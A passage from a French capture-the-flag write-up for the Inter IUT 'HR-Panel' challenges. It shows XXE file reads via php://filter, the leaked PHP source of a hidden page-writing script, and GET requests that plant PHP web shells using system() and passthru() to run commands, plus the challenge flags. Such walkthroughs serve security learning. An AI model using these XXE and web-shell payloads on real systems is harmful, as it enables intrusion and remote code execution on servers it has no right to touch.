CAgPHRyPgogICAgICAgICAgICAgICAgICAgICAgICA8dGggc2NvcGU9InJvdyI+MjwvdGg+CiAgICAgICAgICAgICAgICAgICAgICAgIDx0ZD48YSB0YXJnZXQ9Il9ibGFuayIgaHJlZj0iL3NlcnZpY2VzL3ZhY2F0aW9ucyI+VmFjYXRpb25zPC9hPjwvdGQ+CiAgICAgICAgICAgICAgICAgICAgICAgIDx0ZD5SdW5uaW5nPC90ZD4KICAgICAgICAgICAgICAgICAgICAgICAgPC90cj4KICAgICAgICAgICAgICAgICAgICAgICAgPHRyPgogICAgICAgICAgICAgICAgICAgICAgICA8dGggc2NvcGU9InJvdyI+MzwvdGg+CiAgICAgICAgICAgICAgICAgICAgICAgIDx0ZD48YSB0YXJnZXQ9Il9ibGFuayIgaHJlZj0iL3NlcnZpY2VzL3NsaXBzIj5TbGlwcyB2aWV3ZXI8L2E+PC90ZD4KICAgICAgICAgICAgICAgICAgICAgICAgPHRkPlJ1bm5pbmc8L3RkPgogICAgICAgICAgICAgICAgICAgICAgICA8L3RyPgogICAgICAgICAgICAgICAgICAgICAgICA8dHI+CiAgICAgICAgICAgICAgICAgICAgICAgIDx0aCBzY29wZT0icm93Ij40PC90aD4KICAgICAgICAgICAgICAgICAgICAgICAgPHRkPjxhIHRhcmdldD0iX2JsYW5rIiBocmVmPSIvc2VydmljZXMvcmVxdWVzdHMiPkhSIFJlcXVlc3RzPC9hPjwvdGQ+CiAgICAgICAgICAgICAgICAgICAgICAgIDx0ZD5SdW5uaW5nPC90ZD4KICAgICAgICAgICAgICAgICAgICAgICAgPC90cj4KICAgICAgICAgICAgICAgICAgICAgICAgPHRyPgogICAgICAgICAgICAgICAgICAgICAgICA8dGggc2NvcGU9InJvdyI+NTwvdGg+CiAgICAgICAgICAgICAgICAgICAgICAgIDx0ZD48YSB0YXJnZXQ9Il9ibGFuayIgaHJlZj0iL2FkbWluL3VzZXJzIj5BY2NvdW50IFZlcmlmaWNhdGlvbiBTZXJ2aWNlPC9hPjwvdGQ+CiAgICAgICAgICAgICAgICAgICAgICAgIDx0ZD5SdW5uaW5nPC90ZD4KICAgICAgICAgICAgICAgICAgICAgICAgPC90cj4KICAgICAgICAgICAgICAgICAgICAgICAgPHRyPgogICAgICAgICAgICAgICAgICAgICAgICA8dGggc2NvcGU9InJvdyI+NjwvdGg+CiAgICAgICAgICAgICAgICAgICAgICAgIDwhLS0gPHRkPjxhIHRhcmdldD0iX2JsYW5rIiBocmVmPSIvbWFpbnRlbmFuY2Uvc2NyaXB0cy94Q0Y4UGQzODJRcDN6T1pUYVM3SC5waHAiPkFkZGluZyBwYWdlcyBzZXJ2aWNlPC9hPjwvdGQ+IC0tPgoJCQk8IS0tIE5vdGU6IHRoZSBwaHAgc2NyaXB0IG5hbWUgaGFzIGJlZW4gY2hhbmdlZCB0byBhdm9pZCBicnV0ZWZvcmNlIC0tPgogICAgICAgICAgICAgICAgICAgICAgICA8dGQ+PGEgaHJlZj0iIyIgb25jbGljaz0iYWxlcnQoJ1RoaXMgc2VydmljZSBpcyBjdXJyZW50bHkgdW5hdmFpbGFibGUgdG8geW91LicpOyI+QWRkaW5nIHBhZ2VzIHNlcnZpY2U8L2E+PC90ZD4KICAgICAgICAgICAgICAgICAgICAgICAgPHRkPkluIG1haW50ZW5hbmNlIGR1ZSB0byBzZWN1cml0eSBicmVhY2hlczwvdGQ+CiAgICAgICAgICAgICAgICAgICAgICAgIDwvdHI+CiAgICAgICAgICAgICAgICAgICAgPC90Ym9keT4KICAgICAgICAgICAgICAgIDwvdGFibGU+CiAgICAgICAgICAgIDwvZGl2PgogICAgICAgIDwvZGl2PgogICAgPC9kaXY+Cjw/cGhwIH1lbHNleyA/PgogICAgPGRpdiBjbGFzcz0id3JhcHBlciBmYWRlSW5Eb3duIj4KICAgICAgICA8cCBjbGFzcz0ibGVhZCIgc3R5bGU9ImNvbG9yOiByZWQ7Ij5BY2Nlc3MgZm9yYmlkZGVuLiBUaGlzIHBhcnQgY2FuIG9ubHkgYmUgYWNjZXNzZWQgZnJvbSB0aGUgaW50ZXJuYWwgbmV0d29yay48L3A+CiAgICAgICAgPGltZyBzcmM9Ii9hc3NldHMvSW1hZ2VzL2xvZ28ucG5nIiB3aWR0aD0iMTAwIiBoZWlnaHQ9Ijg4Ij4KICAgIDwvZGl2Pgo8P3BocCB9IGluY2x1ZGUoIi4uLy4uL3RlbXBsYXRlcy9mb290ZXIucGhwIik7ID8+Cg==
+</code></pre></div>
+</details>
+
+<details>
+	<summary>Page interiut_internal_manage.php</summary>
+	<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
+<span class="c1">//CTFIUT{8bb84891897d7eea5244ddbb1662d0def6c30501c38269db0483d892c80dadce}
+</span><span class="c1"></span><span class="nx">session_start</span><span class="p">();</span>
+
+<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">&#34;email&#34;</span><span class="p">])){</span>
+    <span class="nx">header</span><span class="p">(</span><span class="s2">&#34;Location: /&#34;</span><span class="p">);</span>
+    <span class="k">die</span><span class="p">();</span>
+<span class="p">}</span>
+<span class="k">require_once</span><span class="p">(</span><span class="s2">&#34;../../core/database_connect.php&#34;</span><span class="p">);</span>
+<span class="nv">$db</span> <span class="o">=</span> <span class="nx">SqlConnection</span><span class="o">::</span><span class="na">getConnection</span><span class="p">();</span>
+<span class="nv">$sth</span> <span class="o">=</span> <span class="nv">$db</span><span class="o">-&gt;</span><span class="na">prepare</span><span class="p">(</span><span class="s2">&#34;SELECT * FROM users WHERE email = :email&#34;</span><span class="p">);</span>
+<span class="nv">$sth</span><span class="o">-&gt;</span><span class="na">bindValue</span><span class="p">(</span><span class="s2">&#34;:email&#34;</span><span class="p">,</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">&#34;email&#34;</span><span class="p">]);</span>
+<span class="nv">$sth</span><span class="o">-&gt;</span><span class="na">execute</span><span class="p">();</span>
+<span class="nv">$result</span> <span class="o">=</span> <span class="nv">$sth</span><span class="o">-&gt;</span><span class="na">fetchAll</span><span class="p">();</span>
+
+<span class="c1">//header
+</span><span class="c1"></span><span class="k">include</span><span class="p">(</span><span class="s2">&#34;../../templates/header.php&#34;</span><span class="p">);</span>
+<span class="cp">?&gt;</span><span class="err">
+</span><span class="err">&lt;link rel=&#34;stylesheet&#34; href=&#34;/assets/css/form.css&#34;&gt;
+</span><span class="err">&lt;nav class=&#34;navbar navbar-expand-lg navbar-light bg-ligh&#34;&gt;
+</span><span class="err">  &lt;a class=&#34;navbar-brand&#34; href=&#34;/&#34;&gt;
+</span><span class="err">    &lt;img src=&#34;/assets/Images/logo.png&#34; width=&#34;45&#34; height=&#34;40&#34; class=&#34;d-inline-block align-top&#34; alt=&#34;&#34;&gt;
+</span><span class="err">    Inter IUT
+</span><span class="err">  &lt;/a&gt;
+</span><span class="err">  &lt;div class=&#34;collapse navbar-collapse&#34; id=&#34;navbarNavAltMarkup&#34;&gt;
+</span><span class="err">    &lt;div class=&#34;navbar-nav&#34;&gt;
+</span><span class="err">        &lt;a class=&#34;nav-item nav-link&#34; href=&#34;/&#34;&gt;Home&lt;/a&gt;
+</span><span class="err">        &lt;?php if($result[0][&#34;isAdmin&#34;] === &#34;1&#34;){ ?&gt;&lt;a class=&#34;nav-item nav-link active&#34; href=&#34;/admin/users&#34;&gt;Admin &lt;span class=&#34;sr-only&#34;&gt;(current)&lt;/span&gt;&lt;/a&gt;&lt;?php } ?&gt;
+</span><span class="err">        &lt;a class=&#34;nav-item nav-link&#34; href=&#34;/services&#34;&gt;Services&lt;/a&gt;
+</span><span class="err">        &lt;a class=&#34;nav-item nav-link&#34; href=&#34;/contact&#34;&gt;Contact&lt;/a&gt;
+</span><span class="err">        &lt;a class=&#34;nav-item nav-link&#34; href=&#34;/me&#34;&gt;My account&lt;/a&gt;  
+</span><span class="err">        &lt;a class=&#34;nav-item nav-link&#34; href=&#34;/logout&#34;&gt;Logout&lt;/a&gt;
+</span><span class="err">    &lt;/div&gt;
+</span><span class="err">  &lt;/div&gt;
+</span><span class="err">&lt;/nav&gt;
+</span><span class="err">&lt;?php if($_SERVER[&#34;REMOTE_ADDR&#34;] === &#34;127.0.0.1&#34;){ ?&gt;
+</span><span class="err">    &lt;div class=&#34;container&#34;&gt;
+</span><span class="err">        &lt;div class=&#34;row&#34;&gt;
+</span><span class="err">            &lt;div class=&#34;col text-center&#34;&gt;
+</span><span class="err">                &lt;p class=&#34;lead&#34; style=&#34;color: #529bc0;&#34;&gt;Application management service. Status of services:&lt;/p&gt;
+</span><span class="err">                &lt;table class=&#34;table&#34;&gt;
+</span><span class="err">                    &lt;thead&gt;
+</span><span class="err">                        &lt;tr&gt;
+</span><span class="err">                        &lt;th scope=&#34;col&#34;&gt;#&lt;/th&gt;
+</span><span class="err">                        &lt;th scope=&#34;col&#34;&gt;Service&lt;/th&gt;
+</span><span class="err">                        &lt;th scope=&#34;col&#34;&gt;State&lt;/th&gt;
+</span><span class="err">                        &lt;/tr&gt;
+</span><span class="err">                    &lt;/thead&gt;
+</span><span class="err">                    &lt;tbody&gt;
+</span><span class="err">                        &lt;tr&gt;
+</span><span class="err">                        &lt;th scope=&#34;row&#34;&gt;1&lt;/th&gt;
+</span><span class="err">                        &lt;td&gt;&lt;a target=&#34;_blank&#34; href=&#34;/contact&#34;&gt;Contact page&lt;/a&gt;&lt;/td&gt;
+</span><span class="err">                        &lt;td&gt;Running&lt;/td&gt;
+</span><span class="err">                        &lt;/tr&gt;
+</span><span class="err">                        &lt;tr&gt;
+</span><span class="err">                        &lt;th scope=&#34;row&#34;&gt;2&lt;/th&gt;
+</span><span class="err">                        &lt;td&gt;&lt;a target=&#34;_blank&#34; href=&#34;/services/vacations&#34;&gt;Vacations&lt;/a&gt;&lt;/td&gt;
+</span><span class="err">                        &lt;td&gt;Running&lt;/td&gt;
+</span><span class="err">                        &lt;/tr&gt;
+</span><span class="err">                        &lt;tr&gt;
+</span><span class="err">                        &lt;th scope=&#34;row&#34;&gt;3&lt;/th&gt;
+</span><span class="err">                        &lt;td&gt;&lt;a target=&#34;_blank&#34; href=&#34;/services/slips&#34;&gt;Slips viewer&lt;/a&gt;&lt;/td&gt;
+</span><span class="err">                        &lt;td&gt;Running&lt;/td&gt;
+</span><span class="err">                        &lt;/tr&gt;
+</span><span class="err">                        &lt;tr&gt;
+</span><span class="err">                        &lt;th scope=&#34;row&#34;&gt;4&lt;/th&gt;
+</span><span class="err">                        &lt;td&gt;&lt;a target=&#34;_blank&#34; href=&#34;/services/requests&#34;&gt;HR Requests&lt;/a&gt;&lt;/td&gt;
+</span><span class="err">                        &lt;td&gt;Running&lt;/td&gt;
+</span><span class="err">                        &lt;/tr&gt;
+</span><span class="err">                        &lt;tr&gt;
+</span><span class="err">                        &lt;th scope=&#34;row&#34;&gt;5&lt;/th&gt;
+</span><span class="err">                        &lt;td&gt;&lt;a target=&#34;_blank&#34; href=&#34;/admin/users&#34;&gt;Account Verification Service&lt;/a&gt;&lt;/td&gt;
+</span><span class="err">                        &lt;td&gt;Running&lt;/td&gt;
+</span><span class="err">                        &lt;/tr&gt;
+</span><span class="err">                        &lt;tr&gt;
+</span><span class="err">                        &lt;th scope=&#34;row&#34;&gt;6&lt;/th&gt;
+</span><span class="err">                        &lt;!-- &lt;td&gt;&lt;a target=&#34;_blank&#34; href=&#34;/maintenance/scripts/xCF8Pd382Qp3zOZTaS7H.php&#34;&gt;Adding pages service&lt;/a&gt;&lt;/td&gt; --&gt;
+</span><span class="err">			&lt;!-- Note: the php script name has been changed to avoid bruteforce --&gt;
+</span><span class="err">                        &lt;td&gt;&lt;a href=&#34;#&#34; onclick=&#34;alert(&#39;This service is currently unavailable to you.&#39;);&#34;&gt;Adding pages service&lt;/a&gt;&lt;/td&gt;
+</span><span class="err">                        &lt;td&gt;In maintenance due to security breaches&lt;/td&gt;
+</span><span class="err">                        &lt;/tr&gt;
+</span><span class="err">                    &lt;/tbody&gt;
+</span><span class="err">                &lt;/table&gt;
+</span><span class="err">            &lt;/div&gt;
+</span><span class="err">        &lt;/div&gt;
+</span><span class="err">    &lt;/div&gt;
+</span><span class="err">&lt;?php }else{ ?&gt;
+</span><span class="err">    &lt;div class=&#34;wrapper fadeInDown&#34;&gt;
+</span><span class="err">        &lt;p class=&#34;lead&#34; style=&#34;color: red;&#34;&gt;Access forbidden. This part can only be accessed from the internal network.&lt;/p&gt;
+</span><span class="err">        &lt;img src=&#34;/assets/Images/logo.png&#34; width=&#34;100&#34; height=&#34;88&#34;&gt;
+</span><span class="err">    &lt;/div&gt;
+</span><span class="err">&lt;?php } include(&#34;../../templates/footer.php&#34;); ?&gt;
+</span><span class="err">
+</span></code></pre></div>
+</details>
+</p>
+<p>Comme vous pouvez le constater, nous observons une ligne intéressante en haut de la page :</p>
+<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="c1">//CTFIUT{8bb84891897d7eea5244ddbb1662d0def6c30501c38269db0483d892c80dadce}
+</span></code></pre></div><p><strong>FLAG 2 : CTFIUT{8bb84891897d7eea5244ddbb1662d0def6c30501c38269db0483d892c80dadce}</strong></p>
+<h1 id="hr-panel-3---150pts">HR-Panel 3 - 150pts</h1>
+<p><img src="/p/inter-iut-hr-panel-1-2-3/hrpanel3.png"
+	width="497"
+	height="454"
+	srcset="/p/inter-iut-hr-panel-1-2-3/hrpanel3_hu1c2af13e7eedcadab90b982416b18ba1_40670_480x0_resize_box_2.png 480w, /p/inter-iut-hr-panel-1-2-3/hrpanel3_hu1c2af13e7eedcadab90b982416b18ba1_40670_1024x0_resize_box_2.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="109"
+		data-flex-basis="262px"
+	
+></p>
+<p>Au delà du flag, ce fichier contient des informations intéressantes dont deux commentaires pour le moins intriguants :</p>
+<div class="highlight"><pre class="chroma"><code class="language-html" data-lang="html"><span class="c">&lt;!-- &lt;td&gt;&lt;a target=&#34;_blank&#34; href=&#34;/maintenance/scripts/xCF8Pd382Qp3zOZTaS7H.php&#34;&gt;Adding pages service&lt;/a&gt;&lt;/td&gt; --&gt;</span>
+<span class="c">&lt;!-- Note: the php script name has been changed to avoid bruteforce --&gt;</span>
+</code></pre></div><p>Lorsque que l&rsquo;on y accède directement , la page semble exister mais n&rsquo;affiche rien :</p>
+<p><img src="/p/inter-iut-hr-panel-1-2-3/accessible.png"
+	width="1919"
+	height="464"
+	srcset="/p/inter-iut-hr-panel-1-2-3/accessible_hua905d1dd8674decdb9b9694220e7a7fc_17794_480x0_resize_box_2.png 480w, /p/inter-iut-hr-panel-1-2-3/accessible_hua905d1dd8674decdb9b9694220e7a7fc_17794_1024x0_resize_box_2.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="413"
+		data-flex-basis="992px"
+	
+></p>
+<p>Tentons donc d&rsquo;y récupérer son contenu afin de voir ce qui se cache derrière. Pour cela même principe qu&rsquo;avant on se sert de notre LFI :</p>
+<div class="highlight"><pre class="chroma"><code class="language-xml" data-lang="xml"><span class="cp">&lt;!DOCTYPE test [&lt;!ENTITY test SYSTEM &#39;php://filter/convert.base64-encode/resource=/var/www/html/maintenance/scripts/xCF8Pd382Qp3zOZTaS7H.php&#39;&gt;</span>]&gt;
+</code></pre></div><p><details>
+	<summary>Contenu xCF8Pd382Qp3zOZTaS7H.php encodé en base64</summary>
+	<div class="highlight"><pre class="chroma"><code class="language-txt" data-lang="txt">PD9waHAKLyoKVE9ETzoKSXQgaXMgbmVjZXNzYXJ5IHRvIGZpeCB0aGUgcHJvYmxlbSB3aGVuIGFkZGluZyBhIHBhZ2UsIHRvIHByZXZlbnQgcGhwIGZ1bmN0aW9ucyB0byBiZSBjYWxsZWQuIApTb21lIG9mIHRoZW0gYXJlIGRpc2FibGVkIGluIC9ldGMvcGhwLzcuNC9hcGFjaGUyL3BocC5pbmksIGJ1dCBhZnRlciBhbiBpbnRlcm5hbCBwZW50ZXN0LCB0aGV5IHN0aWxsIG1hbmFnZWQgdG8gZXhlY3V0ZSBzb21lIGNvZGUuCiovCmlmKCRfU0VSVkVSWydSRVFVRVNUX01FVEhPRCddID09PSAiR0VUIil7CiAgICBpZihpc3NldCgkX0dFVFsicGFnZUNvbnRlbnQiXSkgJiYgaXNzZXQoJF9HRVRbInBhZ2VOYW1lIl0pKXsgLy8gTXVzdCBiZSBhICRfR0VUIGhlcmUgYmVjYXVzZSB0aGVyZSBpcyBubyBpbnRlcmZhY2UgZm9yIHRoaXMgcGFnZS4KICAgICAgICAkZiA9IGZvcGVuKCIvdmFyL3d3dy9odG1sL21haW50ZW5hbmNlL3RlbXBsYXRpbmdfcGFnZXMvIi5zdHJfcmVwbGFjZSgiLiIsIiIsJF9HRVRbInBhZ2VOYW1lIl0pLiIucGhwIiwiYSsiKTsKICAgICAgICBmd3JpdGUoJGYsJF9HRVRbInBhZ2VDb250ZW50Il0pOwogICAgICAgIGZjbG9zZSgkZik7CiAgICAgICAgZWNobygiUGFnZSB1cGxvYWRlZCB0byAvbWFpbnRlbmFuY2UvdGVtcGxhdGluZ19wYWdlcy8iLnN0cl9yZXBsYWNlKCIuIiwiIiwkX0dFVFsicGFnZU5hbWUiXSkuIi5waHAiKTsKICAgIH0KfQo/Pg==
+</code></pre></div>
+</details>
+
+<details>
+	<summary>Contenu xCF8Pd382Qp3zOZTaS7H.php</summary>
+	<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
+<span class="cm">/*
+</span><span class="cm">TODO:
+</span><span class="cm">It is necessary to fix the problem when adding a page, to prevent php functions to be called. 
+</span><span class="cm">Some of them are disabled in /etc/php/7.4/apache2/php.ini, but after an internal pentest, they still managed to execute some code.
+</span><span class="cm">*/</span>
+<span class="k">if</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;REQUEST_METHOD&#39;</span><span class="p">]</span> <span class="o">===</span> <span class="s2">&#34;GET&#34;</span><span class="p">){</span>
+    <span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&#34;pageContent&#34;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&#34;pageName&#34;</span><span class="p">])){</span> <span class="c1">// Must be a $_GET here because there is no interface for this page.
+</span><span class="c1"></span>        <span class="nv">$f</span> <span class="o">=</span> <span class="nx">fopen</span><span class="p">(</span><span class="s2">&#34;/var/www/html/maintenance/templating_pages/&#34;</span><span class="o">.</span><span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;.&#34;</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&#34;pageName&#34;</span><span class="p">])</span><span class="o">.</span><span class="s2">&#34;.php&#34;</span><span class="p">,</span><span class="s2">&#34;a+&#34;</span><span class="p">);</span>
+        <span class="nx">fwrite</span><span class="p">(</span><span class="nv">$f</span><span class="p">,</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&#34;pageContent&#34;</span><span class="p">]);</span>
+        <span class="nx">fclose</span><span class="p">(</span><span class="nv">$f</span><span class="p">);</span>
+        <span class="k">echo</span><span class="p">(</span><span class="s2">&#34;Page uploaded to /maintenance/templating_pages/&#34;</span><span class="o">.</span><span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;.&#34;</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&#34;pageName&#34;</span><span class="p">])</span><span class="o">.</span><span class="s2">&#34;.php&#34;</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+<span class="cp">?&gt;</span><span class="err">
+</span></code></pre></div>
+</details>
+</p>
+<h2 id="remote-code-execution-rce">Remote Code Execution (RCE)</h2>
+<p>Le contenu est simple et son utilisation est flagrante : En envoyant deux paramètres pageName et pageContent en GET, le backend nous créer un fichier de nom pageName et contenant ce qui sera dans le paramètre pageContent.</p>
+<p>On essaye donc dans un premier temps d&rsquo;avoir le contenu suivant dans le fichier php afin de pouvoir exécuter ce qui sera dans le paramètre cmd:</p>
+<div class="highlight"><pre class="chroma"><code class="language-txt" data-lang="txt">http://hr-panel.interiut.ctf/maintenance/scripts/xCF8Pd382Qp3zOZTaS7H.php?pageName=a&amp;pageContent=&lt;?php echo system($_GET[&#34;cmd&#34;]); ?&gt;
+</code></pre></div><p>La page est bien upload :</p>
+<p><img src="/p/inter-iut-hr-panel-1-2-3/rcetest1.png"
+	width="1303"
+	height="108"
+	srcset="/p/inter-iut-hr-panel-1-2-3/rcetest1_hubba0aaab52600424344d2ff7af733d6c_19620_480x0_resize_box_2.png 480w, /p/inter-iut-hr-panel-1-2-3/rcetest1_hubba0aaab52600424344d2ff7af733d6c_19620_1024x0_resize_box_2.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="1206"
+		data-flex-basis="2895px"
+	
+></p>
+<p>Cependant lorsque que l&rsquo;on se rend dessus et que l&rsquo;on essaye d&rsquo;y exécuter la commande &ldquo;ls&rdquo; , rien ne se passe.</p>
+<p><img src="/p/inter-iut-hr-panel-1-2-3/rcetest1FAIL.png"
+	width="788"
+	height="132"
+	srcset="/p/inter-iut-hr-panel-1-2-3/rcetest1FAIL_hud6119489d4ed332d53b65d400229a94d_8834_480x0_resize_box_2.png 480w, /p/inter-iut-hr-panel-1-2-3/rcetest1FAIL_hud6119489d4ed332d53b65d400229a94d_8834_1024x0_resize_box_2.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="596"
+		data-flex-basis="1432px"
+	
+></p>
+<p>Il est alors possible que la commande soit bloqué. Pour savoir quelles fonctions sont bloqués, on peut entre autres afficher la page d&rsquo;info php avec la fonction phpinfo(). Récréons donc une nouvelle page :</p>
+<div class="highlight"><pre class="chroma"><code class="language-txt" data-lang="txt">http://hr-panel.interiut.ctf/maintenance/scripts/xCF8Pd382Qp3zOZTaS7H.php?pageName=info&amp;pageContent=&lt;?php phpinfo(); ?&gt;
+</code></pre></div><p><img src="/p/inter-iut-hr-panel-1-2-3/info_php.gif"
+	width="1024"
+	height="440"
+	srcset="/p/inter-iut-hr-panel-1-2-3/info_php_hu513d80a5780415e493d89904eacfc9e3_1983761_480x0_resize_box.gif 480w, /p/inter-iut-hr-panel-1-2-3/info_php_hu513d80a5780415e493d89904eacfc9e3_1983761_1024x0_resize_box.gif 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="232"
+		data-flex-basis="558px"
+	
+>
+<img src="/p/inter-iut-hr-panel-1-2-3/disabledfunction.png"
+	width="934"
+	height="162"
+	srcset="/p/inter-iut-hr-panel-1-2-3/disabledfunction_hu6531028fa43ee02345c707c8ac7cbe37_32741_480x0_resize_box_2.png 480w, /p/inter-iut-hr-panel-1-2-3/disabledfunction_hu6531028fa43ee02345c707c8ac7cbe37_32741_1024x0_resize_box_2.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="576"
+		data-flex-basis="1383px"
+	
+>
+On peut y apercevoir qu&rsquo;une grande partie des fonctions permettant de faire executé du code dans le backend sont bloqués, hormis popen() et passthru().
+Utilisons donc cette dernière et naviguons à travers les fichiers du serveur afin d&rsquo;y trouver un fichier intéressant  :</p>
+<div class="highlight"><pre class="chroma"><code class="language-txt" data-lang="txt">http://hr-panel.interiut.ctf/maintenance/scripts/xCF8Pd382Qp3zOZTaS7H.php?pageName=helloRCE&amp;pageContent=&lt;?php passthru($_GET[&#34;cmd&#34;]); ?&gt;
+</code></pre></div><p><img src="/p/inter-iut-hr-panel-1-2-3/rce.gif"
+	width="1024"
+	height="440"
+	srcset="/p/inter-iut-hr-panel-1-2-3/rce_hue2d7f63d9e03312d341982d828e89af8_768010_480x0_resize_box.gif 480w, /p/inter-iut-hr-panel-1-2-3/rce_hue2d7f63d9e03312d341982d828e89af8_768010_1024x0_resize_box.gif 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="232"
+		data-flex-basis="558px"
+	
+></p>
+<p><strong>FLAG 3 : CTFIUT{f4560bf653f0f452848e638d25c83583e50d01f031d384169fc1438673eb6ebc}</strong></p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">Contenus liés</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="has-image">
+    <a href="/p/vsctf-2022-vscaptcha/">
+        
+        
+            <div class="article-image">
+                <img src="/p/vsctf-2022-vscaptcha/cover.8f57b2fb40f3dec4271312c0e2ad871d_hu38fe278006cf35f230a31e53c5b70eba_203359_250x150_fill_q75_box_smart1.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post vsCTF 2022 - vsCAPTCHA"
+                        
+                        data-hash="md5-j1ey&#43;0Dz3sQnExLA4q2HHQ==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">vsCTF 2022 - vsCAPTCHA</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/dctf-2022-bookstore.java/">
+        
+        
+            <div class="article-image">
+                <img src="/p/dctf-2022-bookstore.java/cover.fcf1cd77e146ffcb493cbc811ba094a9_hua098301c826ad8eefb390521eac20c74_299631_250x150_fill_q75_box_smart1.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post DCTF 2022 - BookStore.java"
+                        
+                        data-hash="md5-/PHNd&#43;FG/8tJPLyBG6CUqQ==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">DCTF 2022 - BookStore.java</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/heroctf-v3-winventory/">
+        
+        
+            <div class="article-image">
+                <img src="/p/heroctf-v3-winventory/cover.a0029d17eed506c12795acb1c584a7b2_hu0767c118ba10ca67569e79c8dd3099ad_612104_250x150_fill_q75_box_smart1.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post HeroCTF V3 - Winventory"
+                        
+                        data-hash="md5-oAKdF&#43;7VBsEnlayxxYSnsg==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">HeroCTF V3 - Winventory</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/heroctf-v4-deadalus/">
+        
+        
+            <div class="article-image">
+                <img src="/p/heroctf-v4-deadalus/cover.f82aa23a9ce3d56902419b54a6794f43_hu47698ab55ffe6c3832e7d8a5f4b18af2_764019_250x150_fill_q75_box_smart1.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post HeroCTF V4 - Deadalus"
+                        
+                        data-hash="md5-&#43;CqiOpzj1WkCQZtUpnlPQw==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">HeroCTF V4 - Deadalus</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2021 - 
+        
+        2022 Endeavxor
+    </section>
+    
+    <section class="powerby">
+        
+            Jamais trop tard pour ouvrir un livre. <br/>
+        Généré avec <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
+        Thème <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.16.0">Stack</a></b> conçu par <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
